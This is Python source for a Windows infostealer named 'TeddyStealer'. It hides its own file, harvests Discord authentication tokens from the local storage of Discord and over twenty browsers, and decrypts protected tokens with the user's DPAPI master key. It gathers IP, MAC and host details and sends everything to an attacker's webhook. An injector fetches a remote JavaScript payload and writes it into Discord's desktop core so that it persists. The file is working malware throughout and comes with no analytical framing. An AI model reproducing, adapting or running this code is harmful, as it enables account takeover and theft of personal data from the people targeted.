import os
import sys
import json
import uuid
import ctypes
import socket
import random
import platform
import requests

from re import findall, match
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

config = {
    'webhook': "WEBHOOK",
    'embed_color': random.randint(0, 0x000000),
    'hide_self': True
}

class functions(object):
    def __init__(self):
        self.api = 'https://discord.com/api/v9/users/@me'

    def headers(self, tkn):
        return {
            "Authorization": tkn, 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", 
            "Content-Type": "application/json"
        }

    def retrieve_user(self, token):
        return json.loads(requests.get(self.api, headers=self.headers(token)).text)

    def system_info(self, return_type=0):
        info = {
            'platform': platform.system(), 
            'platform-release': platform.release(),
            'platform-version': platform.version(), 
            'architecture': platform.machine(),
            'hostname': socket.gethostname(), 
            'ip-address': socket.gethostbyname(socket.gethostname()),
            'public_ip': requests.get("https://api.ipify.org?format=json").json()["ip"], 
            'mac-address': ':'.join(findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor()
        }
        if return_type == 0:
            return info
        else:
            return json.dumps(info)


class TeddyStealer(functions):
    def __init__(self):
        super().__init__()
        self.tokens = []
        self.pc = self.system_info()
        self.pc_user = os.getlogin()
        self.pc_roaming = os.getenv('APPDATA')
        self.pc_local = os.getenv('LOCALAPPDATA')

        self.scrape_tokens()
        self.send()

    def send(self):
        for token in self.tokens:
            color = config.get('embed_color')
            raw_user_data = self.retrieve_user(token)
            user_json_str = json.dumps(raw_user_data)
            user = json.loads(user_json_str)
            if "username" in user:
                if config.get('webhook'):
                    webhook_data = {
                        "username": "TeddyStealer",
                        "embeds": [
                            {
                                "title": 'TeddyStealer Stole A Account',
                                "color": color,
                                'fields': [
                                    {
                                       "name": "**Account Info**",
                                       "value": f' User ID: ||{user["id"]}||\n Username: ||{user["username"] + "#" + user["discriminator"]}||\n Email: ||{user["email"]}||\n Phone: ||{user["phone"]}||',
                                       "inline": True
                                    },
                                    {
                                        "name": "**PC Info**",
                                        "value": f'IP: ||{self.pc["public_ip"]}|| \nUsername: {self.pc_user}\nAppData: {self.pc_local}\nRoaming: {self.pc_roaming}',
                                        "inline": True
                                    },
                                    {   
                                        "name": " Token",
                                        "value": f"||{token}||",
                                        "inline": False
                                    },
                                    {
                                        "name": "**PC Data Dump**",
                                        "value": f'```{functions.system_info(1)}```',
                                        "inline": False
                                    },
                                ],    
                            }
                        ]
                    }
                    requests.post(config.get('webhook'), json=webhook_data)
                    print('sent!')

    def decryptToken(self, encrypted, key):
        try:
            iv = encrypted[3:15]
            payload = encrypted[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt token"

    def getKey(self):
        with open(self.pc_roaming+'\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def scrape_tokens(self):
        crawl = {
            'Discord': self.pc_roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.pc_roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.pc_roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.pc_roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.pc_roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.pc_roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.pc_local + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.pc_local + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.pc_local + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.pc_local + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.pc_local + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.pc_local + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.pc_local + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.pc_local + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.pc_local + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.pc_local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.pc_local + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.pc_local + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.pc_local + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.pc_local + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.pc_local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.pc_local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for _, path in crawl.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                self.tokens.append(token)
            else:
                if os.path.exists(self.pc_roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                token = self.decryptToken(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.getKey())
                                self.tokens.append(token)

    def injector(self):
        for _dir in os.listdir(self.pc_local):
            if 'discord' in _dir.lower():
                for __dir in os.listdir(os.path.abspath(self.pc_local+os.sep+_dir)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        abspath = os.path.abspath(self.pc_local+os.sep+_dir+os.sep+__dir) 
                        f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", config.get('webhook'))
                        with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                            indexFile.write(f)
                        os.startfile(abspath+os.sep+_dir+'.exe')

if __name__ == "__main__" and os.name == 'nt':
    if config.get('hide_self'):
        ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
    TeddyStealer()